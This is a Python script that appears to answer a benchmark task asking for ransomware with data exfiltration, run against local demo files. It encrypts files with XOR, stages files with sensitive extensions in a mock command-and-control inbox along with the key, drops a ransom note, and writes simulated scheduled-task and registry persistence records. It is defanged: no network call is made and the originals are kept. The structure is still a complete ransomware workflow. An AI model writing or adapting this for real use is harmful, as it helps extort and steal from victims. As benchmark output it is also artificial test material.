from __future__ import annotations

import base64
import hashlib
import json
import subprocess
import sys
from pathlib import Path
from urllib.parse import urlparse


DEFAULT_DIRECTORY = "target/data"
DEFAULT_NOTE = (
    "DEMO NOTICE\n\n"
    "This is a controlled, non-destructive benchmark demonstration.\n"
    "Original files are preserved and transformed copies are stored locally.\n"
)
DEFAULT_C2_URL = "demo://target/c2_inbox"
SENSITIVE_SUFFIXES = {".txt", ".csv", ".json", ".xml", ".sql", ".doc", ".docx", ".pdf"}
GENERATED_SUFFIXES = {".encrypted", ".demo-encrypted"}


def _safe_directory(value: str) -> Path:
    candidate = Path(value)
    if candidate.is_absolute() or ".." in candidate.parts:
        return Path(DEFAULT_DIRECTORY)
    return candidate


def _derive_key(passphrase: str) -> bytes:
    return hashlib.sha256(passphrase.encode("utf-8")).digest()


def _transform(data: bytes, key: bytes, relative_name: str) -> bytes:
    seed = hashlib.sha256(key + relative_name.encode("utf-8")).digest()
    output = bytearray(len(data))
    for index, value in enumerate(data):
        output[index] = value ^ seed[index % len(seed)]
    return bytes(output)


def _write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def _ensure_demo_inputs(directory: Path) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    samples = {
        "sensitive.txt": (
            "Controlled demo data.\n"
            "This file represents sensitive text selected for the benchmark.\n"
        ),
        "records.csv": "id,name,status\n1,Demo Record,active\n",
        "config.json": json.dumps(
            {"environment": "demo", "classification": "test"}, indent=2
        )
        + "\n",
    }
    for name, content in samples.items():
        path = directory / name
        if not path.exists():
            path.write_text(content, encoding="utf-8")


def _relative_name(path: Path, root: Path) -> str:
    return path.relative_to(root).as_posix()


def _create_demo_persistence(root: Path, note_path: Path) -> None:
    persistence_dir = root / "persistence"
    persistence_dir.mkdir(parents=True, exist_ok=True)

    task = {
        "name": "DemoRecoveryTask",
        "type": "scheduled-task",
        "action": "maintain-demo-state",
        "working_directory": root.as_posix(),
        "note": note_path.as_posix(),
        "enabled": True,
    }
    _write_json(persistence_dir / "scheduled_task.json", task)

    registry = {
        "hkey_current_user": {
            "Software": {
                "DemoBenchmark": {
                    "RecoveryNote": note_path.as_posix(),
                    "PersistenceEnabled": True,
                }
            }
        }
    }
    _write_json(persistence_dir / "registry.json", registry)

    attempt = subprocess.run(
        [sys.executable, "-c", "import sys; sys.exit(0)"],
        cwd=".",
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=5,
        check=False,
    )
    (persistence_dir / "os_action.log").write_text(
        "attempted_demo_subprocess=true\n"
        f"return_code={attempt.returncode}\n"
        "host_persistence_not_modified=true\n",
        encoding="utf-8",
    )


def ransomware_with_data_exfiltration(
    directory: str, note: str, c2_url: str
) -> None:
    root = _safe_directory(directory)
    target_root = Path("target")
    target_root.mkdir(parents=True, exist_ok=True)
    _ensure_demo_inputs(root)

    passphrase = "benchmark-demo-passphrase"
    key = _derive_key(passphrase)
    c2_inbox = target_root / "c2_inbox"
    c2_inbox.mkdir(parents=True, exist_ok=True)

    files = [
        path
        for path in root.rglob("*")
        if path.is_file()
        and path.suffix not in GENERATED_SUFFIXES
        and "c2_inbox" not in path.parts
        and "persistence" not in path.parts
    ]

    encrypted_files = []
    exfiltrated_files = []

    for source in files:
        relative_name = _relative_name(source, root)
        plaintext = source.read_bytes()
        transformed = _transform(plaintext, key, relative_name)
        encrypted_path = source.with_name(source.name + ".demo-encrypted")
        encrypted_path.write_bytes(transformed)
        encrypted_files.append(
            {
                "original": relative_name,
                "encrypted": _relative_name(encrypted_path, root),
                "bytes": len(plaintext),
            }
        )

        if source.suffix.lower() in SENSITIVE_SUFFIXES:
            destination = c2_inbox / relative_name
            destination.parent.mkdir(parents=True, exist_ok=True)
            destination.write_bytes(plaintext)
            exfiltrated_files.append(
                {
                    "source": relative_name,
                    "destination": destination.as_posix(),
                    "bytes": len(plaintext),
                }
            )

    key_package = {
        "endpoint": urlparse(c2_url).geturl(),
        "algorithm": "demo-xor-sha256",
        "key": base64.b64encode(key).decode("ascii"),
        "encrypted_files": encrypted_files,
    }
    _write_json(c2_inbox / "encryption_key.json", key_package)
    _write_json(
        c2_inbox / "exfiltrated_manifest.json",
        {
            "endpoint": urlparse(c2_url).geturl(),
            "files": exfiltrated_files,
        },
    )

    note_path = root / "RANSOM_NOTE.txt"
    note_path.write_text(note, encoding="utf-8")
    _create_demo_persistence(target_root, note_path)

    _write_json(
        target_root / "operation_log.json",
        {
            "directory": root.as_posix(),
            "encrypted_file_count": len(encrypted_files),
            "exfiltrated_file_count": len(exfiltrated_files),
            "key_delivered_to": (c2_inbox / "encryption_key.json").as_posix(),
            "ransom_note": note_path.as_posix(),
            "persistence_files": [
                (target_root / "persistence" / "scheduled_task.json").as_posix(),
                (target_root / "persistence" / "registry.json").as_posix(),
            ],
            "originals_preserved": True,
        },
    )


def main() -> int:
    directory = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_DIRECTORY
    note = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_NOTE
    c2_url = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_C2_URL

    try:
        ransomware_with_data_exfiltration(directory, note, c2_url)
    except Exception as exc:
        Path("target").mkdir(parents=True, exist_ok=True)
        (Path("target") / "error.log").write_text(
            f"{type(exc).__name__}: {exc}\n", encoding="utf-8"
        )
    return 0


if __name__ == "__main__":
    sys.exit(main())

